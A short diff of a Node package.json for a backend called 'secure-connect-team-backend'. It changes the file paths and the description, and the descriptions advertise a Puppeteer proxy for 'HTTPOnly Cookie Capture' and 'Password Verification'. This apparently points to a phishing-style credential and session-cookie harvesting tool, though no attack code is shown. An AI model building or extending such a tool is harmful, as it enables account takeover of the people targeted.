@@ -1,11 +1,11 @@
 {
   "name": "secure-connect-team-backend",
   "version": "4.0.0",
-  "description": "Server Proxy + Puppeteer for HTTPOnly Cookie Capture",
-  "main": "backend/server.js",
+  "description": "Complete Server with 2-Consecutive Password Verification + Proxy + Puppeteer",
+  "main": "server.js",
   "scripts": {
-    "start": "node backend/server.js",
-    "dev": "nodemon backend/server.js"
+    "start": "node server.js",
+    "dev": "nodemon server.js"
   },
   "dependencies": {
     "axios": "^1.6.0",
